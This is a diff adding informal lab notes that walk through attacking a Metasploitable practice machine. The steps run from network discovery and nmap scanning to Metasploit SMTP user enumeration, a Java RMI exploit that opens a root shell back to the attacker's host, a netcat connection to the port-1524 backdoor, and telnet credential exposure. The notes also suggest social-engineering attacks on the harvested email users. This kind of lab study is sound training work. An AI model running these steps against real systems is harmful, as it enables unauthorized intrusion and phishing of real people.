@@ -1,0 +1,57 @@
+First we need to discover the network
+	sudo netdiscover
+now lets do a NMAP on the network and figure out what ports are open
+	sudo nmap -sC -sV -sS -Pn -p- -vv -A -O 10.10.10.4
+We know that there is a bunch of ports open, lets start to get into the ones we have not done yet
+Lets first do SMTP and find some e-mail addresses that we can enumarte users from (port 25)
+	open metasploit
+		msfconsole
+	search smtp
+	now lest figure out what versin smtp we are using, we do this through a banner grab
+		use 8
+		show options
+		set rhosts 10.10.10.4
+		run
+			we can see it is Ubuntu metasploitable.localdomain 
+		lets get some users from the database
+			search smtp
+			use 5
+			show options
+			set rhosts 10.10.10.4
+			THIS MAY TAKE A MINUTE
+		Here is a list of SMTP commands that can be used when in the system
+			http://www.tcpipguide.com/free/t_SMTPCommands-2.htm
+While that is working lets move onto something else
+We have, on port 1099, JAVA RMI, lets see what we can do with this
+	In another terminal open metasploit
+	search java 
+		There is a lot of stuff in there, lets break it down a little further
+		In the NMAP scan we can see that is ia java-rmi, most likely a server
+		ok cool, lets do a search for java_rmi
+			set rhosts 10.10.10.4
+			set lhost 10.10.10.5
+			set srvhost 10.10.10.5
+		Ok right now it wasn't working to well for me, so I decided to try a different target
+			show targets
+			use Linux (2)
+			run
+			sessions -i
+			sessions 1
+			shell
+			whoami
+				we are root, now have fun and jack some stuff up!!!
+By this time we can see that SMTP has ran through its process
+Each user found would be an e-mail address, now alls we need to do is start some social enginnering attacks
+	Now for a quick one, the famous backdoor on port 1524
+		start a listening port in command line 
+			nc 10.10.10.4 1524
+				and we are root :)
+Lastly, lets do a quick telnet
+	First we need to download telnet, so change your connections to be able to hit the internet on the Kali machine
+	This should only take about 10 seconds
+	Now go back to the metasploit machine
+	telnet 10.10.10.4
+		and right there at the top it gives you the username and password... that was easy
+
+		
+	
